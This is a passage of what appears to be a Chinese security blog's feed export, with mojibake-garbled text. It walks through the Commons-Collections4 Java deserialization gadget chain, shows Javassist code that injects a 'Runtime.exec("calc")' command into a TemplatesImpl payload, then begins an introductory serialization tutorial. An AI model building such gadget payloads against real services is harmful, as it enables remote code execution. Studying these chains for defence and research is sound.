id="Commons-Collections4"><a href="#Commons-Collections4" class="headerlink" title="Commons-Collections4"></a>Commons-Collections4</h1><p> å…ˆçœ‹ä¸€ä¸‹Gadgeté“¾ï¼Œå…¥å£æ˜¯JDKè‡ªå¸¦çš„<code>PriorityQueue.readObject()</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; æ–­ç‚¹æ’¸ç ï¼Œæ–­ç‚¹çš„ä½ç½®å¯¹äºæ–°æ‰‹å¯èƒ½æœ‰ç‚¹ä¸çŸ¥é“è¯¥ä»ä½•ä¸‹æ‰‹ï¼Œå…¶å®æŒæ¡ä¸€ç‚¹ï¼Œçœ‹å…¥å£ï¼Œååºåˆ—åŒ–çš„å…¥å£ã€‚<code>Commons-Collections4</code>è¿™é‡Œçš„å…¥å£æ—¶<code>PriorityQueue.readObject()</code>æ–¹æ³•ï¼Œè¿™æ—¶ä½ å¯ä»¥åŒå‡»<code>Shift</code>ï¼Œæ‰¾åˆ°è¯¥ç±»åœ¨readObjectä¸‹æ–­ç‚¹ã€‚<br><img src="https://img-blog.csdnimg.cn/20200518164944907.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; å»æ‰æ³¨é‡Šï¼Œä¹Ÿå°±çœè¿™ä¹ˆå‡ è¡Œä»£ç ã€‚è‡ªå·±ç»“åˆå®˜æ–¹æ–‡æ¡£åˆ†æä¸€ä¸‹å°±çŸ¥é“è¯¥æ–­åœ¨å“ªé‡Œï¼Œå¦‚æœä½ åœ¨çŸ¥é“å…·ä½“æ­¥éª¤ï¼Œä½ å¯ä»¥å°†æ¯ä¸€è¡Œéƒ½è®¾ç½®ä¸ªæ–­ç‚¹è¿›è¡Œåˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        s.readInt();</span><br><span class="line">        queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="æ¼æ´è§¦å‘æµç¨‹-1"><a href="#æ¼æ´è§¦å‘æµç¨‹-1" class="headerlink" title="æ¼æ´è§¦å‘æµç¨‹"></a>æ¼æ´è§¦å‘æµç¨‹</h3><ol><li>ä»ObjectInputStream.readObject()-&gt;PriorityQueue.readObject()-&gt;heapify()æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/2020051816535565.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>æ¥ç€ä¼šæ‰§è¡Œheapify()-&gt;sifrDown()<br><img src="https://img-blog.csdnimg.cn/20200518165629497.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>sifrDown()-&gt;comparatorä¸ä¸ºç©ºè¿›å…¥siftDownUsingComparator()æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/2020051816581125.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>ifåˆ¤æ–­æ˜¯å¦&lt;=0æ˜¯è§¦å‘æ¼æ´<br><img src="https://img-blog.csdnimg.cn/20200518165904692.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>compareæ–¹æ³•ä¼šæ‰§è¡Œtransformerçš„transformæ–¹æ³•ï¼Œè€Œtransformé€šè¿‡åå°„æœºåˆ¶è¢«ä¿®æ”¹è¿‡ï¼Œæœ€åä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚<br><img src="https://img-blog.csdnimg.cn/20200518170453617.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200519095242678.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ol><hr><h3 id="æ¼æ´æˆå› åˆ†æ-1"><a href="#æ¼æ´æˆå› åˆ†æ-1" class="headerlink" title="æ¼æ´æˆå› åˆ†æ"></a>æ¼æ´æˆå› åˆ†æ</h3><p><a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java" target="_blank" rel="noopener">å®Œæ•´çš„å®éªŒä»£ç åœ°å€https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java</a><br>&emsp;&emsp; Javaassistè¢«å¹¿æ³›ç”¨äºä¿®æ”¹å­—èŠ‚ç çš„å·¥å…·åŒ…ï¼Œè€Œæ­¤gadget chainä¸­ä½¿ç”¨ä¿®æ”¹å­—èŠ‚ç çš„å½¢å¼è§¦å‘æ¼æ´ã€‚ä¸€ä¸ª CtClass (ç¼–è¯‘æ—¶ç±»ï¼‰å¯¹è±¡å¯ä»¥å¤„ç†ä¸€ä¸ª class æ–‡ä»¶ï¼ŒClassPool æ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–é»˜è®¤ç³»ç»Ÿç±»æœç´¢è·¯å¾„</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span></span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Payload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">      <span class="comment">// è·å–æˆ‘ä»¬æ¶æ„payloadçš„å¯¹è±¡</span></span><br><span class="line">      <span class="keyword">final</span> CtClass clazz = pool.get(Payload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; ä¿®æ”¹å¥½å­—èŠ‚ç åï¼Œåœ¨é€šè¿‡ä¸€ç³»åˆ—çš„åå°„æ–¹æ³•ï¼Œå°†æ„é€ å¥½çš„å­—èŠ‚åŠ å…¥<code>tamplates</code>ä¸­ï¼Œåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹è§¦å‘æ¼æ´ã€‚åå°„è¿™é‡Œå°±ä¸è¿‡å¤šçš„è§£é‡Šï¼Œå¦‚æœä¸æ‡‚å¯ä»¥çœ‹ç¬”è€…å¾€æœŸçš„åšæ–‡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// é™æ€åˆå§‹åŒ–æ—¶æ’å…¥æ‰§è¡Œå‘½ä»¤çš„å­—èŠ‚ç </span></span><br><span class="line">      String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">      clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"><span class="comment">// å°†åˆå§‹åŒ–åçš„ç±»è®¾ç½®æ–°çš„åå­—</span></span><br><span class="line">      clazz.setName(<span class="string">"Summer"</span> + System.nanoTime());</span><br><span class="line">      <span class="comment">// è®¾ç½®çˆ¶ç±»ä¸ºAbstractTranslet</span></span><br><span class="line">      CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">      clazz.setSuperclass(superC);</span><br><span class="line"><span class="comment">// è·å–ä¿®æ”¹åçš„å­—èŠ‚ç </span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; å…¶å®å°†ç¬¬äºŒä¸ªå ä½åªè¦æ˜¯Objectçš„ç±»å‹å¯¹è±¡å°±å¯ä»¥ï¼Œæ¯”ä¾‹å¯ä»¥æ˜¯<code>tpl.newInstace()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™é‡Œqueueè¦å ä¸¤ä¸ªä½ï¼Œæ¯”è¾ƒæ–¹æ³•æ˜¯è¦ä¸¤ä¸ªæ‰èƒ½æ¯”è¾ƒ</span></span><br><span class="line">      <span class="comment">// ä¸¤ä¸ªä½çš„éƒ½è¦æ˜¯ä¸€ä¸ªç±»å‹ï¼Œè¿™é‡Œéƒ½æ˜¯Object</span></span><br><span class="line">      queue.add(templates);</span><br><span class="line">      queue.add(<span class="keyword">new</span> VerifyError(<span class="string">"Summer"</span>));</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;ä¿®æ”¹å­—èŠ‚ç ä¹‹åæˆ‘ä»¬å†çœ‹çœ‹<code>newTransformer()</code>â€“&gt;<code>TemplatesImpl.getTransletInstance()</code> æ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/20200520141806664.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; <code>getTransletInstance()</code>â€“&gt;<code>defineTransletClasses()</code>ï¼Œè¿™é‡Œä¼šè¿”å›ä¸€ä¸ªå®šä¹‰ä¸»ç±»çš„ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚<br><img src="https://img-blog.csdnimg.cn/20200520142312443.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; æœ€ååœ¨è¿™é‡Œçš„å¼ºåˆ¶ç±»å‹è½¬åŒ–è§¦å‘æ¼æ´ï¼Œåˆ°è¾¾æ‰§è¡Œå‘½ä»¤çš„æ•ˆæœã€‚<br><img src="https://img-blog.csdnimg.cn/20200520142424728.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200520142558464.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>&emsp;&emsp; <code>PriorityQueue</code>åŸæœ¬åªæ˜¯ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼Œ<code>TemplatesImpl</code>åŸæœ¬åªæ˜¯åœ¨xalanä¸­çš„å¤„ç†xmlçš„æ¨¡æ¿å®ç°ï¼Œä½†æ˜¯ç»è¿‡å¤§ä½¬ä¹‹æ‰‹äºŒè€…ç»“åˆäº§ç”Ÿå·¨å¤§æ•ˆæœã€‚å¾ä¸æ•¢ä¸æœï¼Œä¸‹é¢åªæƒ³ç”¨ä¸€å›¾å±•ç°ç¬”è€…å¯¹æ­¤gadgetçš„æ€è€ƒã€‚<br><img src="https://img-blog.csdnimg.cn/20200520144825335.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>&emsp;&emsp; çœ‹å®Œå…¶å®ä¸éš¾å‘ç°ï¼ŒJavaååºåˆ—åŒ–æ¼æ´å¿…ç„¶ç¦»ä¸å¼€Javaçš„åå°„æœºåˆ¶çš„ä½œç”¨ã€‚è¿™ç§éƒ½æ˜¯åº•å±‚çš„Javaè¯­è¨€çš„å¼€å‘è€…æ‰€æƒ³åˆ°ä¾¿äºå¼€å‘çš„æœºåˆ¶ï¼Œä¸‹å›¾æ˜¯oracleå®˜æ–¹ç»™å‡ºçš„å›¾ä¾‹ï¼Œç¬”è€…è§‰å¾—å¦‚æœæƒ³è¦æ‰“å¼€ä¸€ä¸ªæ–°æ–¹å‘å¿…ç„¶ä¼šç”¨åˆ°ä¸€ç§â€œæ–°â€æœºåˆ¶ï¼Œè¿™ç§æœºåˆ¶åº”è¯¥è¿˜æ˜¯å¼€å‘äººå‘˜ç»å¸¸ä½¿ç”¨çš„ã€‚<br><img src="https://img-blog.csdnimg.cn/20200520151819350.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; ä¸€ä¸ªæ–°çš„Gadgetçš„äº§ç”Ÿæ„é€ ç¬”è€…æœ‰å‡ ç‚¹æ„šè§ï¼Œå¦‚æœ‰é”™è¯¯è¿˜æœ›æµ·æ¶µã€‚</p><ol><li>ä¸€ä¸ªJDKè‡ªå¸¦çš„å®ç°<code>Serializabe</code>æ¥å£</li><li>å¿…ç„¶ç¦»ä¸å¼€Javaåå°„æœºåˆ¶</li><li>readObject()æ–¹æ³•</li></ol><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://tool.oschina.net/apidocs/apidoc?api=commons-collections" target="_blank" rel="noopener">https://tool.oschina.net/apidocs/apidoc?api=commons-collections</a><br><a href="https://paper.seebug.org/1195/" target="_blank" rel="noopener">https://paper.seebug.org/1195/</a><br><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">http://blog.orleven.com/2017/11/11/java-deserialize/</a><br><a href="https://xz.aliyun.com/t/7031#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031#toc-5</a><br><a href="https://blog.csdn.net/chenwan8737/article/details/100716015" target="_blank" rel="noopener">https://blog.csdn.net/chenwan8737/article/details/100716015</a><br><a href="https://blog.csdn.net/weixin_33802505/article/details/92214760" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33802505/article/details/92214760</a><br><a href="https://blog.csdn.net/21aspnet/article/details/81671777" target="_blank" rel="noopener">https://blog.csdn.net/21aspnet/article/details/81671777</a><br><a href="https://xalan.apache.org/xalan-j/apidocs/index.html" target="_blank" rel="noopener">https://xalan.apache.org/xalan-j/apidocs/index.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ï»¿# å‰è¨€&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp; å¦‚æœä½ æ²¡æœ‰ååºåˆ—åŒ–çš„åŸºç¡€ï¼Œå»ºè®®ä½ çœ‹ç¬”è€…åšå®¢æ–‡ç« å…ˆå°†åŸºç¡€å­¦ä¹ ä¸€ä¸‹ã€‚å¦‚æœä½ æ²¡æœ‰å­¦ä¹ åˆ†æè¿‡&lt;code&gt;ysoserial--Gadget--URLDNS&lt;/code&gt;ï¼Œå»ºè®®ä½ çœ‹ç¬”è€…ä¹‹å‰å‘è¿‡çš„æ–‡ç« å­¦ä¹ ä¸€ä¸‹ã€‚å¦‚æœä½ æ˜¯å¤§ä½¬ï¼Œå‰é¢å½“ç¬”è€…
      
    
    </summary>
    
    
    
      <category term="Java Commons-Collections" scheme="https://summersec.github.io/tags/Java-Commons-Collections/"/>
    
  </entry>
  
  <entry>
    <title>æ¼«è°ˆJavaååºåˆ—åŒ–</title>
    <link href="https://summersec.github.io/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://summersec.github.io/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-20T04:42:16.000Z</published>
    <updated>2020-05-20T08:11:22.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>&emsp;&emsp; Javaçš„ååºåˆ—åŒ–æ¼æ´æ¢ç´¢å‡ºäº†Javaå®‰å…¨çš„æ–°çºªå…ƒã€‚å¼€å‘äººå‘˜ä¸ºä»€ä¹ˆè¦ååºåˆ—åŒ–å‘¢ï¼Ÿä¼—æ‰€å‘¨çŸ¥ï¼Œç”¨æˆ·å’ŒæœåŠ¡å™¨è¿›è¡Œäº¤äº’æ—¶ï¼Œä¼šä¼ è¾“ä¸€ä¸‹æ•°æ®ï¼Œæ•°æ®ä¼ è¾“å‰éœ€è¦æ ¼å¼åŒ–ï¼Œå°†æ•°æ®è½¬åŒ–æˆæœåŠ¡å™¨è®¤å¯çš„æ ¼å¼ã€‚æ¯”ä¾‹ï¼š<code>JSON</code>ã€<code>XML</code>ã€‚<br>&emsp;&emsp; <code>JSON</code>å’Œ<code>XML</code>çš„ä¼˜ç‚¹æ˜¯å…¼å®¹æ€§æ¯”è¾ƒå¼ºï¼Œæ˜¯é€šç”¨çš„æ•°æ®äº¤äº’æ ¼å¼ã€‚ç¼ºç‚¹æ˜¯ä¸æ”¯æŒå¤æ‚çš„æ•°æ®ç±»å‹ã€‚æ•…å¼€å‘äººå‘˜é¢å¯¹éœ€è¦å¤æ‚çš„æ•°æ®ç±»å‹æ˜¯å°†æ•°æ®ååºåˆ—åŒ–ï¼Œä»¥æ¥è¾¾æ•°æ®äº¤äº’çš„ç›®çš„ã€‚<br>&emsp;&emsp;  Javaç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œä¼šäº§ç”Ÿå¤§é‡çš„æ•°æ®ã€‚æœ‰äº›æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å°†å†…å­˜ä¸­çš„å¯¹è±¡ä¿¡æ¯å­˜å‚¨åˆ°ç£ç›˜æˆ–è€…é€šè¿‡ç½‘ç»œå‘é€ç»™ç¬¬ä¸‰è€…ï¼Œæ­¤æ—¶ï¼Œå°±éœ€è¦å¯¹å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚å½“æˆ‘ä»¬éœ€è¦ä»ç£ç›˜æˆ–ç½‘ç»œè¯»å–å­˜å‚¨çš„ä¿¡æ¯æ—¶ï¼Œå³ä¸ºååºåˆ—åŒ–ã€‚ç®€å•ç†è§£ï¼Œåºåˆ—åŒ–å³å°†å†…å­˜ä¸­çš„å¯¹è±¡ä¿¡æ¯è½¬æ¢ä¸ºå­—èŠ‚æµå¹¶å­˜å‚¨åœ¨ç£ç›˜æˆ–é€šè¿‡ç½‘ç»œå‘é€ã€‚ååºåˆ—åŒ–ï¼Œå³ä»ç£ç›˜æˆ–ç½‘ç»œè¯»å–ä¿¡æ¯ï¼Œç›´æ¥è½¬æ¢ä¸ºå†…å­˜å¯¹è±¡ã€‚</p><p>PS: ä¸ºé¿å…ä»£ç å¤ªé•¿è€Œå¯¼è‡´çš„é˜…è¯»æ•ˆæœï¼Œæ•…å°†å®Œæ•´çš„å®éªŒä»£ç å…¨éƒ¨å·²ç»ä¸Šä¼ è‡³ <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="ååºåˆ—åŒ–demo"><a href="#ååºåˆ—åŒ–demo" class="headerlink" title="ååºåˆ—åŒ–demo"></a>ååºåˆ—åŒ–demo</h1><h2 id="çŸ¥è¯†è¡¥å……"><a href="#çŸ¥è¯†è¡¥å……" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a>çŸ¥è¯†è¡¥å……</h2><p><strong>ååºåˆ—åŒ–æ¼æ´åŸºæœ¬æ¡ä»¶</strong></p><ol><li>Javaååºåˆ—åŒ–ç±»ä¸€å®šè¦å®ç°<code>Serializabe</code>æ¥å£</li><li>æ‰€æœ‰çš„Javaååºåˆ—åŒ–æ¼æ´éƒ½æ˜¯ç”¨é€šè¿‡<code>readObject()</code>å®ç°</li><li>æ‰€æœ‰ååºåˆ—åŒ–æ•°æ®éƒ½æ˜¯è¦é€šè¿‡<code>writeObject()</code>å‡½æ•°å®ç°<br><img src="https://img-blog.csdnimg.cn/20200517185517421.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ol><hr><p><strong>SerialVersionUID</strong><br>&emsp;&emsp; Javaçš„åºåˆ—åŒ–çš„æœºåˆ¶é€šè¿‡åˆ¤æ–­serialVersionUIDæ¥éªŒè¯ç‰ˆæœ¬çš„ä¸€è‡´æ€§ã€‚åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸æœ¬åœ°çš„ç±»çš„serialVersionUIDè¿›è¡Œæ¯”è¾ƒï¼Œä¸€è‡´åˆ™å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œä¸ä¸€è‡´åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸InvalidCastExceptionã€‚IDEAæ˜¯å¯ä»¥è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªserialVersionUIDï¼Œéœ€è¦è®¾ç½®å¦‚ä¸‹ã€‚<br><img src="https://img-blog.csdnimg.cn/20200514152044147.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200514153405922.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="æ¡ˆä¾‹DEMO"><a href="#æ¡ˆä¾‹DEMO" class="headerlink" title="æ¡ˆä¾‹DEMO"></a>æ¡ˆä¾‹DEMO</h2><p><code>javaSerializableDemo1</code>æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaSerializableDemo1</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="comment">// åºåˆ—ç‰ˆæœ¬ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">1877568378649280904L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Integer IdCard;</span><br><span class="line">    <span class="keyword">private</span> Date time;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">javaSerializableDemo1</span><span class="params">(String username, String password, Integer age, Integer idCard, Date time)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        IdCard = idCard;</span><br><span class="line">        <span class="keyword">this</span>.time = time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// çœç•¥ä¸€éƒ¨åˆ†setã€getæ–¹æ³•ã€‚</span></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"javaSerializableDemo&#123;"</span> +</span><br><span class="line">                <span class="string">"username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">", IdCard="</span> + IdCard +</span><br><span class="line">                <span class="string">", time="</span> + time +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javaUnSerizableDemo1</code>æºç ï¼Œä¸€èˆ¬æƒ…å†µä¸‹<code>å¯¹è±¡å†™å…¥æµwriterObject()</code>å’Œ<code>å¯¹è±¡çš„è¾“å‡ºæµreadObject</code>æ˜¯åˆ†å¼€å®ç°çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaUnSerializableDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        javaSerializableDemo1 demo = <span class="keyword">new</span> javaSerializableDemo1(<span class="string">"Summer"</span>,<span class="string">"6666888"</span>,<span class="number">18</span>,<span class="number">666666</span>,<span class="keyword">new</span> Date());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"serializable: "</span> + demo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†å¯¹è±¡å†™å…¥æ–‡ä»¶ä¸­</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"tempFile.txt"</span>);</span><br><span class="line">            oos = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">            oos.writeObject(demo);</span><br><span class="line"></span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯»æ–‡ä»¶</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            ois = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ååºåˆ—åŒ–</span></span><br><span class="line">            javaSerializableDemo1 newdemo = (javaSerializableDemo1) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">"unserializable: "</span> + newdemo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span 